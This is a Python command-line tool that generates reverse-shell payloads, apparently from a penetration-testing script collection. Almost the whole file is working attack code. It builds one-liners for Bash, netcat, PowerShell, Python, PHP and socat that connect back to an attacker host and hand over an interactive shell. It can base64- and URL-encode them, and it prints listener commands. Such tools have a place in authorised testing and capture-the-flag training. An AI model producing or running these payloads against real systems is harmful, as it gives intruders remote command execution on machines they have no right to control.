#!/usr/bin/env python3
"""
Reverse Shell Generator - Multi-Platform Payload Crafter
Part of Cybersecurity Arsenal Scripts
Generates reverse shells for Bash, PowerShell, Python, Netcat, PHP, Perl, Socat,
with support for URL-encoding and Base64 encoding.
"""

import sys
import base64
import urllib.parse
import argparse

def gen_bash_tcp(ip: str, port: int) -> str:
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

def gen_bash_fifo(ip: str, port: int) -> str:
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"

def gen_powershell_base64(ip: str, port: int) -> str:
    raw_script = (
        f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        f"$stream = $client.GetStream();"
        f"[byte[]]$bytes = 0..65535|%{{0}};"
        f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        f"$sendback = (iex $data 2>&1 | Out-String );"
        f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        f"$stream.Write($sendbyte,0,$sendbyte.Length);"
        f"$stream.Flush()}};"
        f"$client.Close()"
    )
    b64 = base64.b64encode(raw_script.encode("utf-16le")).decode("utf-8")
    return f"powershell -nop -w hidden -e {b64}"

def gen_python(ip: str, port: int) -> str:
    return (
        f"python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect((\"{ip}\",{port}));"
        f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
        f"import pty; pty.spawn(\"/bin/bash\")'"
    )

def gen_netcat(ip: str, port: int) -> str:
    return f"nc -e /bin/sh {ip} {port}"

def gen_php(ip: str, port: int) -> str:
    return (
        f"php -r '$sock=fsockopen(\"{ip}\",{port});"
        f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    )

def gen_socat(ip: str, port: int) -> str:
    return f"socat TCP:{ip}:{port} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"

SHELLS = {
    "bash_tcp": ("Bash /dev/tcp", gen_bash_tcp),
    "bash_fifo": ("Bash Named Pipe (mkfifo)", gen_bash_fifo),
    "powershell_b64": ("PowerShell Base64 Encoded", gen_powershell_base64),
    "python": ("Python 3 PTY", gen_python),
    "netcat": ("Netcat -e", gen_netcat),
    "php": ("PHP fsockopen", gen_php),
    "socat": ("Socat Fully Interactive", gen_socat),
}

def main():
    parser = argparse.ArgumentParser(description="Reverse Shell Generator CLI")
    parser.add_argument("--ip", default="10.10.14.5", help="Attacker LHOST IP")
    parser.add_argument("--port", type=int, default=4444, help="Attacker LPORT")
    parser.add_argument("--type", choices=list(SHELLS.keys()) + ["all"], default="all", help="Shell type")
    parser.add_argument("--url-encode", action="store_true", help="URL encode payloads for HTTP parameters")
    parser.add_argument("--base64-encode", action="store_true", help="Base64 encode the output payload")
    
    args = parser.parse_args()
    
    print("=" * 65)
    print(f"      REVERSE SHELL GENERATOR (LHOST={args.ip}, LPORT={args.port})")
    print("=" * 65)
    
    keys = list(SHELLS.keys()) if args.type == "all" else [args.type]
    
    for k in keys:
        name, func = SHELLS[k]
        raw_cmd = func(args.ip, args.port)
        
        output = raw_cmd
        if args.url_encode:
            output = urllib.parse.quote_plus(output)
        elif args.base64_encode:
            output = base64.b64encode(output.encode("utf-8")).decode("utf-8")
            
        print(f"\n[+] {name} [{k}]:")
        print(output)
        
    print("\n" + "=" * 65)
    print(f"  Gợi ý lắng nghe kết nối (Listener):")
    print(f"    nc -lvnp {args.port}")
    print(f"    rlwrap nc -lvnp {args.port}  (để hỗ trợ phím mũi tên & lịch sử)")
    print("=" * 65)

if __name__ == "__main__":
    main()
